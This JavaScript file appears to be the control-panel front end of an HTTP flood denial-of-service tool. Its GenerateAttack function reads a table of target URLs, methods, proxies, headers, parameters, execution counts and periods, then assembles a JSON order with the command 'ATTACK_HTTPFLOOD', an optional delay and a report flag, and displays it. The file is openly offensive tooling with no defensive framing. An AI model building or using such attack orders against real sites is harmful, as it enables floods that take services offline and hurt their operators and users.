'use strict';

/*
 *Extracts targets from the list and build the attack command.
 *
 * @return {Boolean} true if the operation is successful, false if not
 */
function GenerateAttack() 
{
   event.preventDefault();
   
   var oTable = document.getElementById('targets_table');
   var rowsLength = document.getElementById('targets_table').getElementsByTagName("tr").length;
   
   if(rowsLength <= 2){
   	alert("Table of Targets is empty!");
   	return false;
   }

   var attack = {};
   attack.timestamp = Date.now();
   attack.command = "ATTACK_HTTPFLOOD";
   attack.attacks = new Array();

   var i;
   for (i = 1; i < rowsLength; i++){

      var oCells = oTable.rows.item(i).cells;

      var cellLength = oCells.length;
      var target = {};

      target.target = oCells.item(0).innerHTML;
      target.method = oCells.item(1).innerHTML;
      if(oCells.item(2).innerHTML != "none")
         target.proxy = oCells.item(2).innerHTML;

      if(oCells.item(3).innerHTML != "none")
      {
         target.header = {};
         var header = oCells.item(3).innerHTML;
         var h = header.split(' - ');
         var x;
         for(x = 0; x < h.length; x++)
         {
            var temp = h[x].split(':');
            target.header[temp[0]] = temp[1];   
         }            
      }


      if(oCells.item(4).innerHTML != "none")
      {
         target.params = {};
         var params = oCells.item(4).innerHTML;
         var p = params.split(' - ');
         var x;
         for(x = 0; x < p.length; x++)
         {
            var temp = p[x].split(':');
            target.params[temp[0]] = temp[1];   
         } 
      }

      if(oCells.item(5).innerHTML != "null")
         target.executions = oCells.item(5).innerHTML;
      
      if(oCells.item(6).innerHTML != "none")
         target.period = oCells.item(6).innerHTML;
      
      if(target.target != "")
      	attack.attacks.push(target);
   }   

   var deley = document.getElementById('attack_delay').value;
   var delayunit = document.getElementById('attack_delay_option').value;
   console.log(delayunit);
   if(delayunit != "select time unit")
   {   
      var d = deley.split(';');
      attack.delay = d[0]+"-"+d[1]+":"+delayunit;
   }

   var report = document.getElementById('attack_report').checked;
   if(report)
   	attack.report = true;
   else
   	attack.report = false;

   var modalTitle = document.getElementById('response_title');
   var modalContainer = document.getElementById('response_body');
   modalContainer.textContent = JSON.stringify(attack, null, "  ");
   modalTitle.textContent = "Attack:";

   $('#response').modal({ backdrop: 'static', keyboard: true, show: true });

   return true;
};